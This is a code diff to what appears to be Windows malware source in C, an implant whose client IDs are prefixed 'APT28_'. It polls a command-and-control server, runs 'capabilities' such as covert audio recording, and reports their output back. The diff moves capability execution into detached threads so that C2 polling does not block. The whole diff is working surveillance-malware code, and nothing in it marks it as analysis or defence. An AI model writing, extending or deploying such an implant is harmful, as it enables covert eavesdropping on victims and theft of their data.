@@ -206,11 +206,23 @@ int report_capability_result(const char *client_id, CapabilityCommand cmd, const
     return ret;
 }
 
-// Execute capability based on command
-char* execute_capability(CapabilityCommand cmd) {
+// Structure to pass data to capability thread
+typedef struct {
+    char client_id[64];
+    CapabilityCommand cmd;
+} CapabilityThreadData;
+
+// Thread function to execute capability
+DWORD WINAPI capability_execution_thread(LPVOID arg) {
+    CapabilityThreadData *data = (CapabilityThreadData*)arg;
     char *output = NULL;
     
-    switch (cmd) {
+    if (!data) {
+        return 1;
+    }
+    
+    // Execute the capability based on command
+    switch (data->cmd) {
         case CMD_AUDIO_RECORD:
             output = start_audio_recorder();
             break;
@@ -230,7 +242,40 @@ char* execute_capability(CapabilityCommand cmd) {
             break;
     }
     
-    return output;
+    // Report result back to C2 if we got output
+    if (output) {
+        report_capability_result(data->client_id, data->cmd, output);
+        free(output);
+    }
+    
+    // Free thread data
+    free(data);
+    return 0;
+}
+
+// Execute capability based on command (launches in separate thread)
+int execute_capability(const char *client_id, CapabilityCommand cmd) {
+    // Allocate thread data
+    CapabilityThreadData *data = (CapabilityThreadData*)malloc(sizeof(CapabilityThreadData));
+    if (!data) {
+        return 0;
+    }
+    
+    // Copy data for thread
+    strncpy(data->client_id, client_id, sizeof(data->client_id) - 1);
+    data->client_id[sizeof(data->client_id) - 1] = '\0';
+    data->cmd = cmd;
+    
+    // Create thread to execute capability
+    HANDLE hThread = CreateThread(NULL, 0, capability_execution_thread, data, 0, NULL);
+    if (!hThread) {
+        free(data);
+        return 0;
+    }
+    
+    // Detach thread - it will clean up itself
+    CloseHandle(hThread);
+    return 1;
 }
 
 // Generate random sleep interval between 60 and 120 seconds
@@ -244,7 +289,6 @@ DWORD WINAPI c2_communication_thread(LPVOID arg) {
     (void)arg;  // Unused parameter
     char client_id[64];
     CapabilityCommand cmd;
-    char *output = NULL;
     
     // Generate unique client ID
     snprintf(client_id, sizeof(client_id), "APT28_%lu_%lld", (unsigned long)GetCurrentProcessId(), (long long)time(NULL));
@@ -262,17 +306,8 @@ DWORD WINAPI c2_communication_thread(LPVOID arg) {
         cmd = fetch_capability_command(client_id);
         
         if (cmd != CMD_NONE) {
-            // Execute the capability and capture output
-            output = execute_capability(cmd);
-            
-            if (output) {
-                // Report result back to C2 with output data
-                report_capability_result(client_id, cmd, output);
-                
-                // Free the output buffer
-                free(output);
-                output = NULL;
-            }
+            // Execute the capability in a separate thread (non-blocking)
+            execute_capability(client_id, cmd);
         }
     }
     
